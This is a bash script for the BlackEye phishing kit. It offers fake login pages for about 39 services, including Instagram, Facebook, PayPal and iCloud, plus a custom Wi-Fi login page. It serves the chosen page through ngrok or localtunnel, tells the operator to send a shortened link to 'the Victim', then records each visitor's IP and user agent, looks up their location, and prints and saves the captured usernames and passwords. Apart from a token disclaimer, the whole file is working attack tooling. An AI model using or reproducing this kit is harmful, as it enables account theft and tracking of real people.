#!/bin/bash
# Upgraded by: @Git-THE-MERCHANT1

trap 'printf "\n";stop;exit 1' 2
menu() {

printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m               \n"                                
printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m Line  \e[0m         \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;91m Amazon\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;91m iCloud\e[0m          \n"
printf "          \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m   \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m      \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m      \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;91m Reddit\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m MySpace    \e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;91m StackOverflow\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;91m Custom\e[0m         \n"        
printf "          \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                   \n"         
printf "          \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m               \n"
printf "          \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"
printf "          \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m Wi-Fi   \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m PayPal  \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Tiktok \e[0m                             \n"
printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"


read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
 └──╼ ~ ' option



if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="origin"
start

elif [[ $option == 8 ]]; then
server="yahoo"
start

elif [[ $option == 9 ]]; then
server="linkedin"
start

elif [[ $option == 10 ]]; then
server="protonmail"
start

elif [[ $option == 11 ]]; then
server="wordpress"
start

elif [[ $option == 12 ]]; then
server="microsoft"
start

elif [[ $option == 13 ]]; then
server="instafollowers"
start

elif [[ $option == 14 ]]; then
server="pinterest"
start

elif [[ $option == 15 ]]; then
server="apple"
start

elif [[ $option == 16 ]]; then
server="verizon"
start

elif [[ $option == 17 ]]; then
server="dropbox"
start

elif [[ $option == 18 ]]; then
server="line"
start

elif [[ $option == 19 ]]; then
server="shopify"
start

elif [[ $option == 20 ]]; then
server="messenger"
start

elif [[ $option == 21 ]]; then
server="gitlab"
start

elif [[ $option == 22 ]]; then
server="twitch"
start

elif [[ $option == 23 ]]; then
server="myspace"
start

elif [[ $option == 24 ]]; then
server="badoo"
start

elif [[ $option == 25 ]]; then
server="vk"
start

elif [[ $option == 26 ]]; then
server="yandex"
start

elif [[ $option == 27 ]]; then
server="devianart"
start

elif [[ $option == 28 ]]; then
server="wifi"
start

elif [[ $option == 29 ]]; then
server="paypal"
start

elif [[ $option == 30 ]]; then
server="steam"
start

elif [[ $option == 31 ]]; then
server="tiktok"
start

elif [[ $option == 32 ]]; then
server="playstation"
start

elif [[ $option == 33 ]]; then
server="shopping"
start

elif [[ $option == 34 ]]; then
server="amazon"
start

elif [[ $option == 35 ]]; then
server="icloud"
start

elif [[ $option == 36 ]]; then
server="spotify"
start

elif [[ $option == 37 ]]; then
server="netflix"
start

elif [[ $option == 38 ]]; then
server="reddit"
start

elif [[ $option == 39 ]]; then
server="stackoverflow"
start

elif [[ $option == 40 ]]; then
server="create"
createpage
start

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checknode=$(ps aux | grep -o "node" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok 
killall -2 ngrok 
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php 
killall -2 php 
fi
if [[ $checknode == *'node'* ]]; then
pkill -f -2 node 
killall -2 node 
fi

}

banner() {


printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m::     BLACKEYE-IM! By @The-Burning                          ::\e[0m\n"
printf "\n"
}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php 
killall -2 ngrok 
killall -2 node 
exit 1

}

getcredentials() {
echo ' '
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
ipv4=`curl -s https://ipinfo.io/$ip/json | jq -r  '.ip'`
cn=`curl -s https://ipapi.co/$ip//json | jq -r  '.country_name'`
re=`curl -s https://ipapi.co/$ip//json | jq -r  '.region'`
ct=`curl -s https://ipapi.co/$ip//json | jq -r '.city'`
post=`curl -s https://ipapi.co/$ip//json | jq -r  '.postal'`
loc=`curl -s https://ipinfo.io/$ip/json | jq -r  '.loc'`
org=`curl -s https://ipinfo.io/$ip/json | jq -r  '.org'`
tz=`curl -s https://ipinfo.io/$ip/json | jq -r '.timezone'`
lat=`curl -s https://ipapi.co/$ip/json/ | jq -r '.latitude'`
lon=`curl -s https://ipapi.co/$ip/json/ | jq -r '.longitude'`

gm=`echo "https://www.google.com/maps/search/?api=1&query="$lat,$lon`

printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $cn
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" $re
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $ct
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" $post
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" $gm
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $org
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $tz
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt




getcredentials
}
start() {
printf "\n"
printf "1.Ngrok\n"
printf "2.Localtunnel\n"
echo ""
read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
 └──╼ ~ ' host
 
if [[ $host == 1 ]]; then
sleep 1
start_ngrok
elif [[ $host == 2 ]]; then
sleep 1
start_localtunnel
fi
}

start_ngrok() {

    printf "\n"

    # ---------------------------------------------------------
    # 1. Find ngrok installed by the user
    # ---------------------------------------------------------

    ngrok_bin="$(command -v ngrok)"

    if [[ -z "$ngrok_bin" ]]; then
        printf "\e[1;91m[!]\e[0m ngrok is not installed in your PATH.\n"
        printf "\e[1;91m[!]\e[0m Install the current ngrok release and try again.\n"
        return 1
    fi

    # ---------------------------------------------------------
    # 2. Check ngrok version
    # ---------------------------------------------------------

    ngrok_version="$("$ngrok_bin" version 2>/dev/null | awk '{print $3}')"

    if [[ -z "$ngrok_version" ]]; then
        printf "\e[1;91m[!]\e[0m Could not determine ngrok version.\n"
        return 1
    fi

    ngrok_major="${ngrok_version%%.*}"

    if [[ "$ngrok_major" -lt 3 ]]; then
        printf "\e[1;91m[!]\e[0m Your ngrok version is too old: %s\n" "$ngrok_version"
        printf "\e[1;91m[!]\e[0m Please update ngrok and try again.\n"
        return 1
    fi

    printf "\e[1;92m[*]\e[0m Using ngrok: %s\n" "$ngrok_bin"
    printf "\e[1;92m[*]\e[0m Version: %s\n" "$ngrok_version"

    # ---------------------------------------------------------
    # 3. Start local PHP test server
    # ---------------------------------------------------------

    printf "\e[1;92m[*]\e[0m Starting PHP server...\n"

    php_log="/tmp/blackeye-php.log"

    (
        cd "sites/$server" || exit 1
        exec php -S 127.0.0.1:5555
    ) >"$php_log" 2>&1 &

    php_pid=$!

    # Give PHP a moment to start
    sleep 1

    # Check that PHP is still running
    if ! kill -0 "$php_pid" 2>/dev/null; then
        printf "\e[1;91m[!]\e[0m PHP server failed to start.\n"
        printf "\e[1;91m[!]\e[0m PHP output:\n"
        cat "$php_log"
        return 1
    fi

    # Check that the port actually responds
    if ! curl -fsS http://127.0.0.1:5555 >/dev/null 2>&1; then
        printf "\e[1;91m[!]\e[0m PHP server is running but port 5555 is not responding.\n"
        printf "\e[1;91m[!]\e[0m PHP output:\n"
        cat "$php_log"

        kill "$php_pid" 2>/dev/null
        return 1
    fi

    printf "\e[1;92m[*]\e[0m PHP server is ready on 127.0.0.1:5555\n"

    # ---------------------------------------------------------
    # 4. Start ngrok
    # ---------------------------------------------------------

    printf "\e[1;92m[*]\e[0m Starting ngrok...\n"

    ngrok_log="/tmp/blackeye-ngrok.log"

    "$ngrok_bin" http 127.0.0.1:5555 >"$ngrok_log" 2>&1 &

    ngrok_pid=$!

    # ---------------------------------------------------------
    # 5. Wait for ngrok API
    # ---------------------------------------------------------

    ngrok_ready=false
    tunnels_file="/tmp/blackeye-ngrok-tunnels.json"

    for i in {1..20}; do

        if curl -fsS \
            http://127.0.0.1:4040/api/tunnels \
            >"$tunnels_file" 2>/dev/null; then

            ngrok_ready=true
            break
        fi

        # Detect ngrok dying early
        if ! kill -0 "$ngrok_pid" 2>/dev/null; then
            break
        fi

        sleep 1
    done

    # ---------------------------------------------------------
    # 6. Handle ngrok failure
    # ---------------------------------------------------------

    if [[ "$ngrok_ready" != true ]]; then

        printf "\e[1;91m[!]\e[0m ngrok failed to start or its API is unavailable.\n"

        printf "\e[1;91m[!]\e[0m ngrok output:\n"
        cat "$ngrok_log"

        kill "$php_pid" 2>/dev/null
        kill "$ngrok_pid" 2>/dev/null

        return 1
    fi

    # ---------------------------------------------------------
    # 7. Extract public URL using jq
    # ---------------------------------------------------------

    link="$(jq -r '.tunnels[0].public_url // empty' "$tunnels_file")"

    if [[ -z "$link" ]]; then

        printf "\e[1;91m[!]\e[0m ngrok API responded, but no public URL was returned.\n"

        printf "\e[1;91m[!]\e[0m ngrok API response:\n"
        cat "$tunnels_file"

        kill "$php_pid" 2>/dev/null
        kill "$ngrok_pid" 2>/dev/null

        return 1
    fi

    # ---------------------------------------------------------
    # 8. Success
    # ---------------------------------------------------------

    printf "\n"
    printf "\e[1;92m[*]\e[0m ngrok tunnel is ready.\n"
    printf "\e[1;92m[*]\e[0m Public URL: \e[1;77m%s\e[0m\n" "$link"
    printf "\n"

    # Keep these available to the rest of your program if needed.
    NGROK_PID="$ngrok_pid"
    PHP_PID="$php_pid"
    NGROK_URL="$link"
    checkfound
}
echo ""
echo ""

start_localtunnel()  {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 & 
sleep 2

printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
./ngrok http 127.0.0.1:5555 &
sleep 8
lt --port 5555 --subdomain wmw-$server-com &
sleep 4
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
short_link=$(wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt)
printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
echo ""
echo ""

checkfound
}

checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
rm -rf setup.sh
rm -rf tmxsp.sh
rm -rf index.html
rm -rf .gitignore
rm -rf .nojekyll
banner
menu

            
